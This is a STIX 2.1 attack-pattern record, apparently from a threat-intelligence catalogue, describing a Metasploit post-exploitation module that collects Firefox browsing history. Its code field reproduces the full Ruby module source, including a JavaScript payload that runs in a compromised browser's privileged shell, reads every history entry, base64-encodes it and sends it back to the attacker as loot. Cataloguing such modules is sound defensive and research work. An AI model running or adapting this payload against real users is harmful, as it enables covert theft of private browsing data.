{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6e7a4c8-41d7-47a0-bc9a-dc5e09400656",
    "created": "2024-08-14T16:33:13.574809Z",
    "modified": "2024-08-14T16:33:13.574812Z",
    "name": "Firefox Gather History from Privileged Javascript Shell",
    "description": " This module allows collection of the entire browser history from a Firefox Privileged Javascript Shell.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/firefox/gather/history.rb",
            "external_id": "history.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Firefox Gather History from Privileged Javascript Shell',\n        'Description' => %q{\n          This module allows collection of the entire browser history from a Firefox\n          Privileged Javascript Shell.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'joev' ],\n        'DisclosureDate' => '2014-04-11'\n      )\n    )\n\n    register_options([\n      OptInt.new('TIMEOUT', [true, 'Maximum time (seconds) to wait for a response', 90])\n    ])\n  end\n\n  def run\n    results = js_exec(js_payload)\n    if results.present?\n      begin\n        history = JSON.parse(results)\n        history.each do |entry|\n          entry.each_key { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }\n        end\n\n        file = store_loot('firefox.history.json', 'text/json', rhost, history.to_json)\n        print_good(\"Saved #{history.length} history entries to #{file}\")\n      rescue JSON::ParserError => e\n        print_warning(results)\n      end\n    end\n  end\n\n  def js_payload\n    %|\n      (function(send){\n        try {\n          var service = Components\n                .classes[\"@mozilla.org/browser/nav-history-service;1\"]\n                .getService(Components.interfaces.nsINavHistoryService);\n          var b64 = Components.utils.import(\"resource://gre/modules/Services.jsm\").btoa;\n\n          var query = service.getNewQuery();\n          var options = service.getNewQueryOptions();\n          var result = service.executeQuery(query, options);\n          var fields = [];\n          var entries = [];\n\n          var root = result.root;\n          root.containerOpen = true;\n\n          for (var i = 0; i < result.root.childCount; ++i) {\n            var child = result.root.getChild(i);\n            if (child.type == child.RESULT_TYPE_URI) {\n              entries.push({\n                uri: b64(child.uri),\n                title: b64(child.title),\n                time: b64(child.time),\n                accessCount: b64(child.accessCount)\n              });\n            }\n          }\n\n          result.root.containerOpen = false;\n\n          send(JSON.stringify(entries));\n        } catch (e) {\n          send(e);\n        }\n      })(this.send);\n    |.strip\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-11"
}